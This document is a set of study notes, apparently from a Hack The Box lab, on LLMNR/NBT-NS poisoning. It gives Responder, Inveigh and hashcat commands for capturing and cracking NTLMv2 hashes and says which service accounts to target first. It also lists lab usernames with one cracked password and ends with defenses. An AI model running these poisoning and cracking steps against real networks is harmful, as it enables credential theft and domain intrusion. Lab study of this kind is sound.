create a deitaled notes tof rtht waht we elans everyhting

Complete Notes: LLMNR/NBT-NS Poisoning Attack
1. What is This Attack?
Simple Explanation:
When a Windows machine cant find a server via DNS
it SHOUTS to the whole network "does anyone know where X is?"
WE reply "YES I AM X" 
Victim believes us and sends us their password hash
We crack the hash = we have real credentials
2. Protocols Involved
DNS (Normal)
├── Computer asks DNS server "where is printer01?"
├── DNS replies with IP address
└── Everything works fine ✅

LLMNR (When DNS Fails)
├── Port 5355 UDP
├── Computer broadcasts to ENTIRE network
├── "ANYONE know where printer01 is??"
├── ANY machine can reply ← VULNERABILITY
└── We reply with our IP ← ATTACK

NBT-NS (When LLMNR Also Fails)
├── Port 137 UDP
├── Older protocol same concept
├── Uses NetBIOS names
└── Same vulnerability exists
3. Attack Flow
Step 1: Employee types wrong hostname
        \\fileserver01 → types → \\fileservr01

Step 2: DNS says "never heard of it"

Step 3: Computer broadcasts to network
        "DOES ANYONE KNOW WHERE fileservr01 IS??"

Step 4: WE (attacker) reply immediately
        "YES! I AM fileservr01! CONNECT TO ME!"

Step 5: Victim connects to us
        Sends USERNAME + NTLMv2 PASSWORD HASH

Step 6: We capture the hash

Step 7: We crack hash offline with Hashcat

Step 8: We have real username + password
        = Domain foothold achieved
4. What Triggers This Attack
Human Mistakes:
✅ Typos in hostnames     \\fileserver → \\fileservr
✅ Wrong share names      \\backup01   → \\bakcup01
✅ Old bookmarks          pointing to deleted servers

Automatic (No Human Needed):
✅ Service accounts       run 24/7 automatically
✅ Scheduled tasks        backup jobs, scan jobs
✅ Windows background     OS makes requests itself
✅ Broken applications    pointing to old servers

Most Valuable Automatic Sources:
→ svc_* accounts     (service accounts run constantly)
→ backup* accounts   (backup jobs run at night)
→ admin* accounts    (admin tools phone home)
5. Tools Used
┌─────────────┬──────────────┬────────────────────────────┐
│ Tool        │ Platform     │ Use                        │
├─────────────┼──────────────┼────────────────────────────┤
│ Responder   │ Linux        │ LLMNR/NBT-NS poisoning     │
│ Inveigh.ps1 │ Windows PS   │ PowerShell version         │
│ Inveigh.exe │ Windows C#   │ Better maintained version  │
│ Hashcat     │ Linux/Win    │ Crack captured hashes      │
└─────────────┴──────────────┴────────────────────────────┘
6. Identifying the Right Network Interface
Always run on the interface where VICTIMS are

Your ifconfig showed:
┌──────────┬─────────────────┬──────────────────────────────┐
│Interface │ IP              │ Purpose                      │
├──────────┼─────────────────┼──────────────────────────────┤
│docker0   │ 172.17.0.1      │ Docker containers USELESS ❌ │
│ens192    │ 10.129.116.138  │ HTB VPN connection  USELESS ❌│
│ens224    │ 172.16.5.225    │ Internal network    USE THIS ✅│
│lo        │ 127.0.0.1       │ Loopback            USELESS ❌│
└──────────┴─────────────────┴──────────────────────────────┘

How to confirm right interface:
# Check for Windows machines (port 445 = Windows)
nmap -p 445 172.16.5.0/23 --open

# Ping sweep to find alive hosts
fping -a -g 172.16.5.0/23 2>/dev/null

Rule: Pick interface on SAME network as targets
      IP range means NOTHING about OS type
      Always verify with nmap
7. Responder (Linux) - All Commands
bash
# STEP 1: Analyze mode first (safe, no poisoning)
sudo responder -I ens224 -A
# Just listens, sends nothing
# See who is making LLMNR requests
# Use this for recon first

# STEP 2: Active poisoning
sudo responder -I ens224
# Now actively replies to all requests
# Captures hashes automatically

# STEP 3: With extra options (recommended)
sudo responder -I ens224 -wf
# -w = fake WPAD proxy (catches browser traffic)
# -f = fingerprint victim OS versions

# STEP 4: Run in background with tmux
tmux new -s responder          # create tmux session
sudo responder -I ens224       # run responder inside
CTRL+B then D                  # detach, keep running
tmux attach -t responder       # come back to check later

# STEP 5: Check captured hashes
ls /usr/share/responder/logs/
# Files named: PROTOCOL-HASHTYPE-VICTIMIP.txt
# Example:     SMB-NTLMv2-SSP-172.16.5.25.txt
Responder Options Explained
-I ens224    → which network interface to use
-A           → analyze only, dont poison (safe mode)
-w           → start fake WPAD proxy server
-f           → fingerprint victim OS
-v           → verbose output (more details)
-r           → answer netbios wredir queries
-d           → answer netbios domain queries
-F           → force NTLM auth on WPAD
Responder Log Files
/usr/share/responder/logs/
├── SMB-NTLMv2-SSP-172.16.5.25.txt    ← hash from this IP via SMB
├── SMB-NTLMv2-SSP-172.16.5.200.txt   ← hash from this IP via SMB
├── HTTP-NTLMv2-172.16.5.200.txt      ← hash via HTTP
├── Proxy-Auth-NTLMv2-172.16.5.200.txt← hash via proxy
└── Responder-Session.log              ← full session log
8. Inveigh (Windows) - All Commands
PowerShell Version
powershell
# Import module
Import-Module .\Inveigh.ps1

# Start with recommended options
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Stop it
Stop-Inveigh

# Check hashes after stopping
$InveighCovert.NTLMv2 | Select-Object -Unique
C# Version (Inveigh.exe)
powershell
# MUST run as Administrator
# Right click PowerShell → Run as Administrator

# Run with defaults
.\Inveigh.exe

# Run without sniffer (if getting socket errors)
.\Inveigh.exe -Sniffer N

# Interactive console commands (press ESC first!)
GET NTLMV2            → all captured NTLMv2 hashes
GET NTLMV2UNIQUE      → one hash per user (no duplicates)
GET NTLMV2USERNAMES   → usernames + IPs only (summary)
GET CLEARTEXT         → any cleartext passwords
STOP                  → stop Inveigh
Difference Between GET Commands
GET NTLMV2USERNAMES shows:
172.16.5.125 | ACADEMY-EA-FILE | svc_qualys | 5F9BB670
                                               ↑
                                    Challenge only NOT crackable
                                    Just tells you WHO you captured

GET NTLMV2UNIQUE shows:
svc_qualys::INLANEFREIGHT:5F9BB670:AABBCC...[full long hash]
↑
FULL hash → copy this → crack with hashcat
Check Output Files
powershell
# Inveigh saves to C:\Tools automatically
type C:\Tools\Inveigh-NTLMv2.txt

# Filter for specific user
Select-String -Path C:\Tools\Inveigh-NTLMv2.txt -Pattern "svc_qualys"
9. Common Inveigh Errors and Fixes
ERROR 1:
"Error starting packet sniffer, check elevated privilege"
FIX: Right click PowerShell → Run as Administrator

ERROR 2:
"Failed to start HTTP listener on port 80"
FIX: Find and kill process using port 80
     netstat -ano | findstr :80
     taskkill /PID [number] /F

ERROR 3:
"GET is not recognized as cmdlet"
FIX: You typed GET in PowerShell terminal
     Press ESC first to enter Inveigh console
     THEN type GET commands

ERROR 4:
Socket permission errors
FIX: Run as Admin AND/OR use -Sniffer N flag
     .\Inveigh.exe -Sniffer N
10. Cracking Hashes with Hashcat
bash
# STEP 1: Save hash to file
echo "USERNAME::DOMAIN:CHALLENGE:HASH:BLOB" > hash.txt

# STEP 2: Basic crack with rockyou
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# STEP 3: If not found, try with rules
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule

# STEP 4: Check if already cracked
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
Hashcat Options Explained
-m 5600      → hash type (5600 = NTLMv2)
hash.txt     → file containing your captured hash
rockyou.txt  → wordlist (14 million real passwords)
--show       → show already cracked passwords
-r           → apply rules (mutates passwords)
best64.rule  → tries Password1 P@ssword etc
Hash Types Reference
NTLMv2    → -m 5600  ← most common from Responder
NTLMv1    → -m 5500
NT hash   → -m 1000  (pass the hash attacks)
11. Hashes We Captured in This Lab
User          │ Hash File              │ Password Found
──────────────┼────────────────────────┼───────────────
FOREND        │ forend_ntlmv2          │ Klmcargo2
backupagent   │ SMB-NTLMv2-SSP-...txt │ (crack it)
wley          │ wley_hash.txt          │ (crack it)
svc_qualys    │ svc_qualys_hash.txt    │ (crack it)
12. Targeting Priority - Which Hashes to Crack First
HIGHEST PRIORITY:
→ svc_*      Service accounts (high privileges, access everywhere)
→ backup*    Backup accounts (need access to ALL machines)
→ admin*     Admin accounts (obvious reasons)
→ *admin*    Anything with admin in name

MEDIUM PRIORITY:
→ Regular domain users (limited but still useful)

WHY service accounts are valuable:
svc_qualys needs to SCAN all machines
= Has local admin on many/all machines
= Cracking it = access to entire domain potentially
13. Complete Attack Chain Summary
Phase 1: Setup
└── ifconfig → identify internal network interface (ens224)
└── nmap -p 445 172.16.5.0/23 → confirm Windows machines there

Phase 2: Capture
└── tmux new -s responder
└── sudo responder -I ens224 -wf
└── Wait 30mins to few hours
└── Let it run while doing other enumeration

Phase 3: Review
└── ls /usr/share/responder/logs/
└── Identify high value accounts (svc_*, backup*, admin*)
└── Prioritize those hashes

Phase 4: Crack
└── hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
└── Try rules if not found: -r best64.rule
└── hashcat --show to see cracked passwords

Phase 5: Use Credentials
└── You now have real domain username + password
└── Begin authenticated enumeration
└── Check what systems the account can access
└── Look for privilege escalation paths
14. Defenses Against This Attack
DISABLE LLMNR:
Group Policy →
Computer Configuration →
Administrative Templates →
Network → DNS Client →
"Turn OFF Multicast Name Resolution" → ENABLE

DISABLE NBT-NS (PowerShell script via GPO):
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" `
    -Name NetbiosOptions -Value 2
}

OTHER DEFENSES:
→ Enable SMB Signing (prevents relay attacks)
→ Network segmentation (limit broadcast domains)
→ IDS/IPS monitoring ports 5355 and 137
→ Monitor Event IDs 4697 and 7045
→ Monitor registry key:
   HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
   EnableMulticast = 0 means LLMNR disabled
15. Key Things to Remember
1. Responder NEVER stops itself → you CTRL+C when done

2. Always use tmux → run responder in background
   while doing other enumeration tasks

3. Hashes saved even after stopping →
   /usr/share/responder/logs/

4. GET NTLMV2USERNAMES → just shows WHO (not crackable)
   GET NTLMV2UNIQUE    → shows FULL hash (crackable)

5. Press ESC first before typing GET commands in Inveigh

6. Always run Inveigh as Administrator

7. IP range doesnt tell you OS type
   Use nmap -p 445 to confirm Windows machines

8. NTLMv2 hashes CANNOT be used for pass-the-hash
   Must crack them to get plaintext password

9. Service accounts are highest priority targets
   They have more privileges than regular users

10. The longer you run Responder = more hashes captured
    Service accounts trigger automatically
    You dont need humans to make mistakes
